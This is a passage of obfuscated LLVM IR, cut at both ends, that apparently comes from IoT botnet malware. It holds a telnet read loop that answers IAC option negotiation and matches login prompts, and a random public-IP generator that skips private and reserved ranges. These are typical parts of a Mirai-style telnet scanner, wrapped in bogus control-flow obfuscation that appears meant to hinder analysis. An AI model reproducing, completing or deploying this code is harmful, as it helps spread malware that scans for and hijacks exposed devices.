  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %232, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  %50 = load i32, i32* @x.67
  %51 = load i32, i32* @y.68
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %48
  %58 = load i32, i32* @x.67
  %59 = load i32, i32* @y.68
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %66, label %233

; <label>:66:                                     ; preds = %originalBBpart2
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 0
  %70 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %69) #2, !srcloc !5
  %71 = extractvalue { i64, i64* } %70, 0
  %72 = extractvalue { i64, i64* } %70, 1
  %73 = trunc i64 %71 to i32
  store i32 %73, i32* %24, align 4
  %74 = ptrtoint i64* %72 to i64
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %25, align 4
  br label %76

; <label>:76:                                     ; preds = %67
  %77 = load i32, i32* %10, align 4
  %78 = srem i32 %77, 64
  %79 = zext i32 %78 to i64
  %80 = shl i64 1, %79
  %81 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %82 = load i32, i32* %10, align 4
  %83 = sdiv i32 %82, 64
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [16 x i64], [16 x i64]* %81, i64 0, i64 %84
  %86 = load i64, i64* %85, align 8
  %87 = or i64 %86, %80
  store i64 %87, i64* %85, align 8
  %88 = load i32, i32* %10, align 4
  %89 = add nsw i32 %88, 1
  %90 = call i32 @select(i32 %89, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %91 = icmp slt i32 %90, 1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %76
  %93 = load i32, i32* @x.67
  %94 = load i32, i32* @y.68
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %92
  %101 = load i32, i32* @x.67
  %102 = load i32, i32* @y.68
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %233

; <label>:109:                                    ; preds = %76
  %110 = load i8*, i8** %15, align 8
  %111 = load i32, i32* %18, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  store i8* %113, i8** %23, align 8
  %114 = load i32, i32* %10, align 4
  %115 = load i8*, i8** %23, align 8
  %116 = call i64 @recv(i32 %114, i8* %115, i64 1, i32 0)
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  %118 = load i32, i32* %19, align 4
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %139, label %120

; <label>:120:                                    ; preds = %109
  %121 = load i32, i32* @x.67
  %122 = load i32, i32* @y.68
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %120
  %129 = load i32, i32* %19, align 4
  %130 = icmp eq i32 %129, 0
  %131 = load i32, i32* @x.67
  %132 = load i32, i32* @y.68
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %130, label %139, label %156

; <label>:139:                                    ; preds = %originalBBpart28, %109
  %140 = load i32, i32* @x.67
  %141 = load i32, i32* @y.68
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %139
  store i32 0, i32* %9, align 4
  %148 = load i32, i32* @x.67
  %149 = load i32, i32* @y.68
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %238

; <label>:156:                                    ; preds = %originalBBpart28
  %157 = load i32, i32* %19, align 4
  %158 = load i32, i32* %18, align 4
  %159 = add nsw i32 %158, %157
  store i32 %159, i32* %18, align 4
  %160 = load i8*, i8** %23, align 8
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 255
  br i1 %163, label %164, label %202

; <label>:164:                                    ; preds = %156
  %165 = load i32, i32* @x.67
  %166 = load i32, i32* @y.68
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %164
  %173 = load i32, i32* %10, align 4
  %174 = load i8*, i8** %23, align 8
  %175 = getelementptr inbounds i8, i8* %174, i64 1
  %176 = call i64 @recv(i32 %173, i8* %175, i64 2, i32 0)
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %19, align 4
  %178 = load i32, i32* %19, align 4
  %179 = icmp eq i32 %178, -1
  %180 = load i32, i32* @x.67
  %181 = load i32, i32* @y.68
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %179, label %191, label %188

; <label>:188:                                    ; preds = %originalBBpart216
  %189 = load i32, i32* %19, align 4
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %191, label %192

; <label>:191:                                    ; preds = %188, %originalBBpart216
  store i32 0, i32* %9, align 4
  br label %238

; <label>:192:                                    ; preds = %188
  %193 = load i32, i32* %19, align 4
  %194 = load i32, i32* %18, align 4
  %195 = add nsw i32 %194, %193
  store i32 %195, i32* %18, align 4
  %196 = load i32, i32* %10, align 4
  %197 = load i8*, i8** %23, align 8
  %198 = call i32 @negotiate(i32 %196, i8* %197, i32 3)
  %199 = icmp ne i32 %198, 0
  br i1 %199, label %201, label %200

; <label>:200:                                    ; preds = %192
  store i32 0, i32* %9, align 4
  br label %238

; <label>:201:                                    ; preds = %192
  br label %232

; <label>:202:                                    ; preds = %156
  %203 = load i8*, i8** %15, align 8
  %204 = load i8*, i8** %11, align 8
  %205 = call i8* @strstr(i8* %203, i8* %204) #10
  %206 = icmp ne i8* %205, null
  br i1 %206, label %214, label %207

; <label>:207:                                    ; preds = %202
  %208 = load i32, i32* %12, align 4
  %209 = icmp ne i32 %208, 0
  br i1 %209, label %210, label %231

; <label>:210:                                    ; preds = %207
  %211 = load i8*, i8** %15, align 8
  %212 = call i32 @matchPrompt(i8* %211)
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %214, label %231

; <label>:214:                                    ; preds = %210, %202
  %215 = load i32, i32* @x.67
  %216 = load i32, i32* @y.68
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %214
  store i32 1, i32* %20, align 4
  %223 = load i32, i32* @x.67
  %224 = load i32, i32* @y.68
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %233

; <label>:231:                                    ; preds = %210, %207
  br label %232

; <label>:232:                                    ; preds = %231, %201
  br label %33

; <label>:233:                                    ; preds = %originalBBpart220, %originalBBpart24, %originalBBpart2
  %234 = load i32, i32* %20, align 4
  %235 = icmp ne i32 %234, 0
  br i1 %235, label %236, label %237

; <label>:236:                                    ; preds = %233
  store i32 1, i32* %9, align 4
  br label %238

; <label>:237:                                    ; preds = %233
  store i32 0, i32* %9, align 4
  br label %238

; <label>:238:                                    ; preds = %237, %236, %200, %191, %originalBBpart212
  %239 = load i32, i32* %9, align 4
  ret i32 %239

originalBBalteredBB:                              ; preds = %originalBB, %48
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %92
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %120
  %240 = load i32, i32* %19, align 4
  %241 = icmp eq i32 %240, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %139
  store i32 0, i32* %9, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %164
  %242 = load i32, i32* %10, align 4
  %243 = load i8*, i8** %23, align 8
  %244 = getelementptr inbounds i8, i8* %243, i64 1
  %245 = call i64 @recv(i32 %242, i8* %244, i64 2, i32 0)
  %246 = trunc i64 %245 to i32
  store i32 %246, i32* %19, align 4
  %247 = load i32, i32* %19, align 4
  %248 = icmp eq i32 %247, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %214
  store i32 1, i32* %20, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #2
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #2
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %426, %0
  %15 = load i32, i32* @x.69
  %16 = load i32, i32* @y.70
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 127
  %26 = load i32, i32* @x.69
  %27 = load i32, i32* @y.70
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %424, label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %424, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 3
  br i1 %41, label %424, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @x.69
  %44 = load i32, i32* @y.70
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 15
  %54 = load i32, i32* @x.69
  %55 = load i32, i32* @y.70
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %53, label %424, label %62

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.69
  %64 = load i32, i32* @y.70
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 16
  %74 = load i32, i32* @x.69
  %75 = load i32, i32* @y.70
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %73, label %424, label %82

; <label>:82:                                     ; preds = %originalBBpart28
  %83 = load i32, i32* @x.69
  %84 = load i32, i32* @y.70
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 56
  %94 = load i32, i32* @x.69
  %95 = load i32, i32* @y.70
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %93, label %424, label %102

; <label>:102:                                    ; preds = %originalBBpart212
  %103 = load i32, i32* @x.69
  %104 = load i32, i32* @y.70
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %102
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 10
  %114 = load i32, i32* @x.69
  %115 = load i32, i32* @y.70
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %113, label %424, label %122

; <label>:122:                                    ; preds = %originalBBpart216
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 192
  br i1 %125, label %126, label %146

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* @x.69
  %128 = load i32, i32* @y.70
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %126
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 168
  %138 = load i32, i32* @x.69
  %139 = load i32, i32* @y.70
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %137, label %424, label %146

; <label>:146:                                    ; preds = %originalBBpart220, %122
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 172
  br i1 %149, label %150, label %174

; <label>:150:                                    ; preds = %146
  %151 = load i32, i32* @x.69
  %152 = load i32, i32* @y.70
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %150
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp sge i32 %160, 16
  %162 = load i32, i32* @x.69
  %163 = load i32, i32* @y.70
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %161, label %170, label %174

; <label>:170:                                    ; preds = %originalBBpart224
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp slt i32 %172, 32
  br i1 %173, label %424, label %174

; <label>:174:                                    ; preds = %170, %originalBBpart224, %146
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 100
  br i1 %177, label %178, label %218

; <label>:178:                                    ; preds = %174
  %179 = load i32, i32* @x.69
  %180 = load i32, i32* @y.70
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %178
  %187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %188 = zext i8 %187 to i32
  %189 = icmp sge i32 %188, 64
  %190 = load i32, i32* @x.69
  %191 = load i32, i32* @y.70
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %189, label %198, label %218

; <label>:198:                                    ; preds = %originalBBpart228
  %199 = load i32, i32* @x.69
  %200 = load i32, i32* @y.70
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %198
  %207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp slt i32 %208, 127
  %210 = load i32, i32* @x.69
  %211 = load i32, i32* @y.70
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %209, label %424, label %218

; <label>:218:                                    ; preds = %originalBBpart232, %originalBBpart228, %174
  %219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 169
  br i1 %221, label %222, label %242

; <label>:222:                                    ; preds = %218
  %223 = load i32, i32* @x.69
  %224 = load i32, i32* @y.70
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %222
  %231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp sgt i32 %232, 254
  %234 = load i32, i32* @x.69
  %235 = load i32, i32* @y.70
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %233, label %424, label %242

; <label>:242:                                    ; preds = %originalBBpart236, %218
  %243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 198
  br i1 %245, label %246, label %270

; <label>:246:                                    ; preds = %242
  %247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %248 = zext i8 %247 to i32
  %249 = icmp sge i32 %248, 18
  br i1 %249, label %250, label %270

; <label>:250:                                    ; preds = %246
  %251 = load i32, i32* @x.69
  %252 = load i32, i32* @y.70
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %250
  %259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %260 = zext i8 %259 to i32
  %261 = icmp slt i32 %260, 20
  %262 = load i32, i32* @x.69
  %263 = load i32, i32* @y.70
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %261, label %424, label %270

; <label>:270:                                    ; preds = %originalBBpart240, %246, %242
  %271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %272 = zext i8 %271 to i32
  %273 = icmp eq i32 %272, 224
  br i1 %273, label %424, label %274

; <label>:274:                                    ; preds = %270
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 6
  br i1 %277, label %422, label %278

; <label>:278:                                    ; preds = %274
  %279 = load i32, i32* @x.69
  %280 = load i32, i32* @y.70
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %278
  %287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 7
  %290 = load i32, i32* @x.69
  %291 = load i32, i32* @y.70
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %289, label %422, label %298

; <label>:298:                                    ; preds = %originalBBpart244
